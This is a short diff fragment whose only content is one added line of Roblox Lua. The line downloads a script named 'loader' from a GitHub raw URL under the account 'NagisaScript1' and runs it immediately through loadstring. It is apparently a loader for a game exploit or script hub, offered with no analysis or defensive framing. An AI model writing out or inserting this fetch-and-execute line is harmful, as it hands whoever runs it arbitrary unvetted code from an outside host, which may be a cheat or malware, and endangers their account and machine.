@@ -1,0 +1,3 @@
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NagisaScript1/NativeScript/refs/heads/main/loader"))()
